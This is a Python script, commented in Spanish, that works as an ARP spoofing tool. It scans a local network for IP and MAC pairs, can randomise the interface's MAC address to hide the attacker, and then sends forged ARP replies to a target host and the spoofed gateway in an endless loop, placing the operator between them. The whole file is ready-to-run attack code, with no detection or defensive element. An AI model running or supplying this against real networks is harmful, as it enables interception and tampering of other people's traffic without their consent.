#!/bin/python3

import argparse
import os
from scapy.all import *
from time import sleep

if os.geteuid() != 0:
    print ("¡EJECUTA COMO ROOT!".center(100, "="))
    exit()
else:
    pass

parser = argparse.ArgumentParser()
parser.add_argument("-s", "--scan", dest="scan", help="Escanear la red para encontrar IP o MAC del objetivo. Introduce una IP o un rango. Ejemplo: ./arpSpoof.py -s 10.0.2.1/24")
parser.add_argument("-m", "--mac", dest="mac", help="Cambiar a una MAC aleatoria antes de iniciar el ataque ( true ). Ejemplo: ./arpSpoof.py -m true")
parser.add_argument("-i", "--interface", dest="interface", help="Interfaz a configurar. Ejemplo: ./arpSpoof.py -i eth0")

options = parser.parse_args()

conjuntoCars = ["A", "B", "C", "D", "E", "F"]

def scan(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst='FF:FF:FF:FF:FF:FF')

    arp_request_broadcast = broadcast/arp_request

    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    print ( "IP".center(44), "MAC\n" )
    for i in answered_list:
        print ( '\t\t', i[1].psrc, "\t\t", i[1].src )
    

try:
    if options.scan:
        scan(options.scan)
        pass

    if options.mac and options.interface:

        for i in range(0, 9):
            conjuntoCars.append( i )

        nuevaMac = ""
        contador = 0
        while contador < 6:

            if contador == 0:
                nuevaMac += str(random.choice(conjuntoCars)) + str(random.choice(range(0,9,2)))
            else:
                nuevaMac += str(random.choice(conjuntoCars)) + str(random.choice(conjuntoCars))

            contador += 1

            if contador < 6:
                nuevaMac += ":"
            else:
                continue
        print ( "\n[+] Estableciendo la MAC " + nuevaMac + " sobre " + options.interface)

        subprocess.call(["ifconfig", options.interface, "down"])
        subprocess.call(["ifconfig", options.interface, "hw", "ether", nuevaMac])
        subprocess.call(["ifconfig", options.interface, "up"])

        subprocess.call(["ip", "--color", "link", "show", options.interface])


    # RESPUESTA ARP

    targetIp = input("Introduce la IP del objetivo: ")
    targetMac = input("Introduce la MAC del objetivo: ")
    ipSpoof = input("Introduce la IP a spoofear: ")

    ## MAC DEL SEGUNDO OBJETIVO - ROUTER

    arp_request = ARP(pdst=ipSpoof)
    broadcast = Ether(dst='FF:FF:FF:FF:FF:FF')

    arp_request_broadcast = broadcast/arp_request

    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    macObjetivo2 =  answered_list[0][1].src
    
    ## SE GENERAN PAQUETES PARA LOS OBJETIVOS

    packet0 = ARP(op=2, pdst=targetIp, hwdst=targetMac, psrc=ipSpoof)
    packet1 = ARP(op=2, pdst=ipSpoof, hwdst=macObjetivo2, psrc=targetIp)

    packetCount = 0
    while True:
        send(packet0, verbose=False)
        send(packet1, verbose=False)

        packetCount += 1
        print ( "[+] Paquetes enviados: " + str(packetCount), end="\r")
        sleep(1)

except KeyboardInterrupt:
    print ("Se ha interrumpido el script...")
    exit()

